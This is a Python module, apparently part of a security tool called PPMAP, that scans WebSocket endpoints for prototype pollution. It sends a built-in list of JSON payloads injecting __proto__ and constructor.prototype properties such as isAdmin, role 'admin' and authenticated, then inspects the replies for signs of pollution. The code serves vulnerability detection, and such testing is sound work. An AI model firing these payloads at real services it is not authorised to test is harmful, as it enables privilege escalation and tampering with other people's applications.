"""
WebSocket Prototype Pollution Scanner for PPMAP v5.0
Detect PP vulnerabilities in WebSocket communications.
"""
import json
import logging
import asyncio
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from urllib.parse import urlparse

try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    
logger = logging.getLogger(__name__)


@dataclass
class WebSocketFinding:
    """WebSocket PP vulnerability finding."""
    url: str
    message_type: str
    payload: str
    response: str
    severity: str = "HIGH"
    verified: bool = False
    evidence: Dict[str, Any] = field(default_factory=dict)


# WebSocket Proto Pollution Payloads
WEBSOCKET_PP_PAYLOADS = [
    # Standard JSON message formats
    {
        'type': 'message',
        'data': {'__proto__': {'polluted': True}}
    },
    {
        'action': 'update',
        'payload': {'__proto__': {'isAdmin': True}}
    },
    {
        'event': 'user_update',
        'data': {'constructor': {'prototype': {'role': 'admin'}}}
    },
    # Nested pollution
    {
        'type': 'request',
        'body': {
            'user': {
                '__proto__': {'authenticated': True}
            }
        }
    },
    # Socket.io format
    {
        '0': 'message',
        '1': {'__proto__': {'socketio_polluted': True}}
    },
    # Action/reducer pattern (Redux-like)
    {
        'type': 'SET_USER',
        'payload': {'__proto__': {'redux_polluted': True}}
    },
    # GraphQL subscription format
    {
        'type': 'start',
        'payload': {
            'query': 'subscription { events }',
            'variables': {'__proto__': {'subscription_polluted': True}}
        }
    },
]


class WebSocketScanner:
    """
    Scanner for WebSocket prototype pollution vulnerabilities.
    
    Features:
    - Connect to WebSocket endpoints
    - Send PP payloads
    - Analyze responses for pollution indicators
    - Support for common WS protocols
    """
    
    def __init__(self,
                 timeout: int = 10,
                 extra_headers: Optional[Dict[str, str]] = None):
        """
        Initialize WebSocket scanner.
        
        Args:
            timeout: Connection/receive timeout in seconds
            extra_headers: Additional headers for connection
        """
        if not WEBSOCKETS_AVAILABLE:
            raise ImportError("websockets package required. Install with: pip install websockets")
        
        self.timeout = timeout
        self.extra_headers = extra_headers or {}
        self._ws = None
    
    @staticmethod
    def http_to_ws(url: str) -> str:
        """Convert HTTP URL to WebSocket URL."""
        parsed = urlparse(url)
        
        if parsed.scheme == 'https':
            ws_scheme = 'wss'
        elif parsed.scheme == 'http':
            ws_scheme = 'ws'
        else:
            ws_scheme = parsed.scheme
        
        return f"{ws_scheme}://{parsed.netloc}{parsed.path}"
    
    async def connect(self, url: str) -> bool:
        """
        Connect to WebSocket endpoint.
        
        Args:
            url: WebSocket URL (ws:// or wss://)
            
        Returns:
            True if connected successfully
        """
        try:
            # Convert HTTP to WS if needed
            if url.startswith('http'):
                url = self.http_to_ws(url)
            
            self._ws = await asyncio.wait_for(
                websockets.connect(
                    url,
                    extra_headers=self.extra_headers,
                    ping_timeout=self.timeout,
                    close_timeout=self.timeout
                ),
                timeout=self.timeout
            )
            logger.info(f"Connected to WebSocket: {url}")
            return True
            
        except asyncio.TimeoutError:
            logger.warning(f"WebSocket connection timeout: {url}")
            return False
        except Exception as e:
            logger.warning(f"WebSocket connection failed: {e}")
            return False
    
    async def close(self):
        """Close WebSocket connection."""
        if self._ws:
            await self._ws.close()
            self._ws = None
    
    async def send_payload(self, payload: Dict) -> Optional[str]:
        """
        Send PP payload and get response.
        
        Args:
            payload: JSON payload to send
            
        Returns:
            Response message if received, None otherwise
        """
        if not self._ws:
            logger.warning("WebSocket not connected")
            return None
        
        try:
            message = json.dumps(payload)
            await self._ws.send(message)
            
            # Wait for response
            try:
                response = await asyncio.wait_for(
                    self._ws.recv(),
                    timeout=self.timeout
                )
                return response
            except asyncio.TimeoutError:
                return None
                
        except Exception as e:
            logger.debug(f"Send/receive error: {e}")
            return None
    
    async def test_payloads(self, url: str,
                            custom_payloads: Optional[List[Dict]] = None) -> List[WebSocketFinding]:
        """
        Test WebSocket endpoint with PP payloads.
        
        Args:
            url: WebSocket URL
            custom_payloads: Optional custom payloads
            
        Returns:
            List of findings
        """
        findings = []
        payloads = custom_payloads or WEBSOCKET_PP_PAYLOADS
        
        connected = await self.connect(url)
        if not connected:
            return findings
        
        try:
            for payload in payloads:
                response = await self.send_payload(payload)
                
                finding = self._analyze_response(url, payload, response)
                if finding:
                    findings.append(finding)
                    
                # Small delay between payloads
                await asyncio.sleep(0.1)
                
        finally:
            await self.close()
        
        return findings
    
    def _analyze_response(self, url: str, payload: Dict,
                          response: Optional[str]) -> Optional[WebSocketFinding]:
        """Analyze response for PP indicators."""
        if not response:
            return None
        
        response_lower = response.lower()
        payload_str = json.dumps(payload)
        
        # Check for pollution indicators
        indicators = [
            ('polluted', 'true'),
            ('isadmin', 'true'),
            ('role', 'admin'),
            ('authenticated', 'true'),
            ('__proto__', ''),
        ]
        
        for indicator, expected in indicators:
            if indicator in response_lower:
                if not expected or expected in response_lower:
                    return WebSocketFinding(
                        url=url,
                        message_type=payload.get('type', payload.get('action', 'unknown')),
                        payload=payload_str,
                        response=response[:500],  # Truncate long responses
                        severity='HIGH',
                        verified=False,
                        evidence={'indicator': indicator}
                    )
        
        # Check for error messages that reflect our payload
        if '__proto__' in response or 'prototype' in response_lower:
            return WebSocketFinding(
                url=url,
                message_type=payload.get('type', 'unknown'),
                payload=payload_str,
                response=response[:500],
                severity='MEDIUM',
                verified=False,
                evidence={'payload_reflection': True}
            )
        
        return None
    
    def scan_sync(self, url: str, **kwargs) -> List[WebSocketFinding]:
        """
        Synchronous wrapper for async scanning.
        
        Args:
            url: WebSocket URL
            **kwargs: Additional options
            
        Returns:
            List of findings
        """
        return asyncio.get_event_loop().run_until_complete(
            self.test_payloads(url, **kwargs)
        )


def scan_websocket(url: str, **kwargs) -> List[Dict]:
    """
    Convenience function to scan a WebSocket URL for PP.
    
    Args:
        url: Target WebSocket URL
        **kwargs: Additional options
        
    Returns:
        List of findings as dicts
    """
    try:
        scanner = WebSocketScanner(**kwargs)
    except ImportError as e:
        logger.error(str(e))
        return []
    
    findings = scanner.scan_sync(url)
    
    return [
        {
            'type': 'websocket_pp',
            'url': f.url,
            'message_type': f.message_type,
            'payload': f.payload,
            'response': f.response,
            'severity': f.severity,
            'verified': f.verified,
            'evidence': f.evidence,
        }
        for f in findings
    ]


async def scan_websocket_async(url: str, **kwargs) -> List[Dict]:
    """
    Async function to scan a WebSocket URL for PP.
    
    Args:
        url: Target WebSocket URL
        **kwargs: Additional options
        
    Returns:
        List of findings as dicts
    """
    try:
        scanner = WebSocketScanner(**kwargs)
    except ImportError as e:
        logger.error(str(e))
        return []
    
    findings = await scanner.test_payloads(url)
    
    return [
        {
            'type': 'websocket_pp',
            'url': f.url,
            'message_type': f.message_type,
            'payload': f.payload,
            'response': f.response,
            'severity': f.severity,
            'verified': f.verified,
            'evidence': f.evidence,
        }
        for f in findings
    ]
